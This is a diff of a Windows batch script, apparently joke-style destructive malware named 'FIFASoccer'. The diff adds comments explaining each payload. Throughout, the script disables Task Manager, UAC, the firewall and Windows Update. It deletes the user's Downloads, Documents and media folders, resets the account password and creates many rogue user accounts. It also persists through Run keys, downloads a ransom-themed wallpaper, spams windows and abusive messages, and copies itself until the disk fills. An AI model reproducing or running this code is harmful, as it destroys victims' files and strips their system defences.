@@ -1,38 +1,8 @@
-::[Bat To Exe Converter]
-::
-::YAwzoRdxOk+EWAjk
-::fBw5plQjdCyDJGyX8VAjFC5HSRa+GGStCLkT6ezo0+mSsgMUV+1f
-::YAwzuBVtJxjWCl3EqQJgSA==
-::ZR4luwNxJguZRRnk
-::Yhs/ulQjdF+5
-::cxAkpRVqdFKZSTk=
-::cBs/ulQjdF+5
-::ZR41oxFsdFKZSDk=
-::eBoioBt6dFKZSDk=
-::cRo6pxp7LAbNWATEpCI=
-::egkzugNsPRvcWATEpCI=
-::dAsiuh18IRvcCxnZtBJQ
-::cRYluBh/LU+EWAnk
-::YxY4rhs+aU+JeA==
-::cxY6rQJ7JhzQF1fEqQJQ
-::ZQ05rAF9IBncCkqN+0xwdVs0
-::ZQ05rAF9IAHYFVzEqQJQ
-::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
-::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
-::cRolqwZ3JBvQF1fEqQJQ
-::dhA7uBVwLU+EWDk=
-::YQ03rBFzNR3SWATElA==
-::dhAmsQZ3MwfNWATElA==
-::ZQ0/vhVqMQ3MEVWAtB9wSA==
-::Zg8zqx1/OA3MEVWAtB9wSA==
-::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFC5HSRa+GGStCLkT6ezo08yuhGwuW+E8fZ2V36yLQA==
-::YB416Ek+ZW8=
-::
-::
-::978f952a14a936cc963da21a135fa983
 @echo off
 cls
+
+:: Sets Vars
+
 set A1=%tmp%\~404.vbs
 set A2=%tmp%\~4042.vbs
 set A3=%tmp%\~4043.vbs
@@ -42,24 +12,27 @@ set A6=%tmp%\~4046.vbs
 set A7=%tmp%\~4047.vbs
 set A8=%tmp%\~4047.vbs
 set A9=%tmp%\~507.vbs
+
+:: Adds Keys to registry to disable Task Manager and UAC
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /f /d 1
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 
 
-
+:: Starts fake error Message
 echo.X=MsgBox("DLL is missing.",0+16,"Error") >> %A1%
 start %A1%
 
 timeout 5 >NUL
 
+:: Deletes every single file on the system
 del "%userprofile%\Downloads" /f /s /q
 del "%userprofile%\Documents" /f /s /q
 del "%userprofile%\Music" /f /s /q
 del "%userprofile%\Videos" /f /s /q
 del "%userprofile%\Pictures" /f /s /q
 
-
+:: CD-Rom Payload
 echo Set oWMP=CreateObject("WMplayer.OCX.7")>>123.vbs
 echo Set colCDROMs=oWMP.cdromCollection>>123.vbs
 echo do>>123.vbs
@@ -74,6 +47,7 @@ echo End If>>123.vbs
 echo wscript.sleep 5000>>123.vbs
 echo loop>>123.vbs
 
+:: Creates a Batch File that pings Apple 50000 times.
 echo @echo off>>n3o.bat
 echo cls>>n3o.bat
 echo title haxxed!!!!!!!!!!>>n3o.bat
@@ -81,24 +55,31 @@ echo echo You are a gay furry trans homosexual femboy>>n3o.bat
 echo ping apple.com -t -l 50000>>n3o.bat
 echo pause>>n3o.bat
 
+:: Copies files to C drives and hides them
 copy /y 123.vbs C:\
 copy /y 1234.vbs C:\
 copy /y n3o.bat C:\
 attrib +s +h c:\123.vbs
 attrib +s +h c:\n3o.bat
 
+:: Adds Registry Keys to disable shutdown and restart buttons, Change the legal notice text and caption on Bootup, And adds the proccesses to Run on bootup
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoClose /t REG_DWORD /f /d 1
 reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticetext /f /d "ITS TIME TO KICK SOME ASS!!!"
 reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticecaption /f /d "HAXXED"
 reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 123.vbs /d c:\123.vbs
 reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v n3o.bat /d c:\n3o.bat
 
+:: Hides files again
 attrib +s +h c:\123.vbs
 attrib +s +h c:\n3o.bat
 
+:: Starts CD-ROM Payload
 start C:\123.vbs
 
+:: Changes User Password to "fucku"
 net user %username% fucku
+
+:: Disables Windows Firewall
 netsh firewall set opmode disable
 netsh firewall set opmode mode=DISABLE
 netsh advfirewall set currentprofile state off
@@ -107,8 +88,10 @@ netsh advfirewall set privateprofile state off
 netsh advfirewall set publicprofile state off
 netsh advfirewall set allprofiles state off
 
+:: Sends a message
 msg * Lets have some fun!
 
+:: Random Keys Payload
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
@@ -116,6 +99,7 @@ powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}') 
 
+:: Spam Proccesses payload
 start explorer.exe
 start explorer.exe
 start explorer.exe
@@ -130,14 +114,16 @@ start explorer.exe
 start explorer.exe
 start calc
 
+:: Creates the error messages
 echo.X=MsgBox("Ohhhh shit!",0+16,"Windows is now slowing down time.") >> %A2%
-echo.X=MsgBox("explorer.exe has been detected as Trojan.Win32.FuckerTractor, Do you even have the time to remove it?,0+16,"Alert!") >> %A3%
-echo.X=MsgBox("Your C Drive got deleted, what a shame.,0+16,"Oh no!") >> %A4%
-echo.X=MsgBox("THEEZ IEZ ME DOOM,0+16,"Mydoom") >> %A5%
-echo.X=MsgBox("Trojan found in RAM named Trojan.Win32.Suscat, God how are you such a lazy ass?,0+16,"Alert!") >> %A6%
-echo.X=MsgBox("Trojan found in Start Menu named Email-Worm.Win32.Susc4tFUCKED, Remove it now!,0+16,"Alert!") >> %A7%
-echo.X=MsgBox("FUCK ME!!!!!!!!!!!!!!!,0+16,"Alert!") >> %A8%
+echo.X=MsgBox("explorer.exe has been detected as Trojan.Win32.FuckerTractor, Do you even have the time to remove it?",0+16,"Alert!") >> %A3%
+echo.X=MsgBox("Your C Drive got deleted, what a shame.",0+16,"Oh no!") >> %A4%
+echo.X=MsgBox("THEEZ IEZ ME DOOM",0+16,"Mydoom") >> %A5%
+echo.X=MsgBox("Trojan found in RAM named Trojan.Win32.Suscat, God how are you such a lazy ass?",0+16,"Alert!") >> %A6%
+echo.X=MsgBox("Trojan found in Start Menu named Email-Worm.Win32.Susc4tFUCKED, Remove it now!",0+16,"Alert!") >> %A7%
+echo.X=MsgBox("FUCK ME!!!!!!!!!!!!!!!",0+16,"Alert!") >> %A8%
 
+:: Starts Adware
 start http://canyoublockit.com/extreme-test/
 start http://canyoublockit.com/extreme-test/
 start http://canyoublockit.com/extreme-test/
@@ -146,7 +132,7 @@ start http://canyoublockit.com/extreme-test/
 start http://canyoublockit.com/extreme-test/
 start http://canyoublockit.com/extreme-test/
 
-
+:: Starts the error messages
 start %A2%
 start %A3%
 start %A4%
@@ -176,9 +162,12 @@ start %A6%
 start %A7%
 start %A8%
 
+:: Creates script
 echo Set WshShell = WScript.CreateObject("WScript.Shell")` >> %A9%  
 echo WshShell.AppActivate "notepad" >> %A9%
 echo WshShell.SendKeys "{ENTER}" >> %A9%
+
+:: Annoy Payload (Starts random programs and random searches)
 
 explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
 explorer.exe Shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}
@@ -281,17 +270,23 @@ powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{C}')
 timeout 8 >NUL
 
-copy FIFASoccer.exe /y C:\Windows
-attrib +s +h C:\Windows\FIFASoccer.exe
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v FIFASoccer.exe /d C:\Windows\FIFASoccer.exe
-attrib +s +h C:\Windows\FIFASoccer.exe
+:: Copies itself to the windows directory (in exe version, this payload is different)
+copy FIFASoccer.bat /y C:\Windows
+attrib +s +h C:\Windows\FIFASoccer.bat
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v FIFASoccer.bat /d C:\Windows\FIFASoccer.bat
+attrib +s +h C:\Windows\FIFASoccer.bat
+
+:: Stops the windows update service
 
 net stop wuauserv
+
+:: Speech Payload (Creates an annoying speaking VBS File that loops itself)
 echo.do>>succ.vbs
 echo.CreateObject("sapi.spVoice").speak "Hahahahahahahahehehehahahahaeheheheheahahahehahehaheahehahehahhahahehaheehaehahehahaahahaheahahahaeaaaah">>succ.vbs
 echo.loop>>succ.vbs
 start succ.vbs
 
+:: More Keys
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{B}')
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{A}')
@@ -301,6 +296,7 @@ powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ENTER}')
 powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ESCAPE}')
 
+:: Adds alot of Users
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
@@ -322,6 +318,8 @@ net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
+
+:: Spams Programs and error messages
 start explorer
 start explorer
 start explorer
@@ -368,10 +366,12 @@ start %A6%
 start %A7%
 start %A8%
 
-
+:: Sets Wallpaper (it can remove the wallpaper sometimes)
 set IMG_URL=https://raw.githubusercontent.com/neo6942/neo-database/refs/heads/main/win/r4nsom.jpg
 powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
 powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"
+
+:: Opens Magnifier and Inverts the colors
 set append=00000001
 set key=HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier
 set value=Invert
@@ -381,23 +381,26 @@ echo previous=%oldVal%
 set newVal=%oldVal%%append% 
 reg add %key% /v %value% /d %newVal% /f /t REG_DWORD
 
+:: Sends a message
 msg * Will you be my Valentine?
 
+:: FINAL PAYLOAD
+:: Copies and Spreads itself everywhere in Windows and making random folders untill C drive is full
 
 :final
-copy FIFASoccer.exe /y C:\Windows\fifa%random%.exe
-copy FIFASoccer.exe /y C:\Windows\System32\fifa%random%.exe
-copy FIFASoccer.exe /y C:\Windows\System\fifa%random%.exe
-copy FIFASoccer.exe /y C:\fifa%random%.exe
-copy FIFASoccer.exe /y C:\Windows\Temp\fifa%random%.exe
-copy FIFASoccer.exe /y C:\Windows\Prefetch\fifa%random%.exe
-copy FIFASoccer.exe /y %userprofile%\Downloads\fifa%random%.exe
-copy FIFASoccer.exe /y %userprofile%\Documents\fifa%random%.exe
-copy FIFASoccer.exe /y %userprofile%\Music\fifa%random%.exe
-copy FIFASoccer.exe /y %userprofile%\Pictures\fifa%random%.exe
-copy FIFASoccer.exe /y %userprofile%\Videos\fifa%random%.exe
-copy FIFASoccer.exe /y %userprofile%\fifa%random%.exe
-copy FIFASoccer.exe /y "C:\Program Files\fifa%random%.exe"
+copy FIFASoccer.bat /y C:\Windows\fifa%random%.exe
+copy FIFASoccer.bat /y C:\Windows\System32\fifa%random%.exe
+copy FIFASoccer.bat /y C:\Windows\System\fifa%random%.exe
+copy FIFASoccer.bat /y C:\fifa%random%.exe
+copy FIFASoccer.bat /y C:\Windows\Temp\fifa%random%.exe
+copy FIFASoccer.bat /y C:\Windows\Prefetch\fifa%random%.exe
+copy FIFASoccer.bat /y %userprofile%\Downloads\fifa%random%.exe
+copy FIFASoccer.bat /y %userprofile%\Documents\fifa%random%.exe
+copy FIFASoccer.bat /y %userprofile%\Music\fifa%random%.exe
+copy FIFASoccer.bat /y %userprofile%\Pictures\fifa%random%.exe
+copy FIFASoccer.bat /y %userprofile%\Videos\fifa%random%.exe
+copy FIFASoccer.bat /y %userprofile%\fifa%random%.exe
+copy FIFASoccer.bat /y "C:\Program Files\fifa%random%.exe"
 mkdir C:\Windows\%random%
 mkdir C:\%random%
 mkdir C:\Windows\System32\%random%
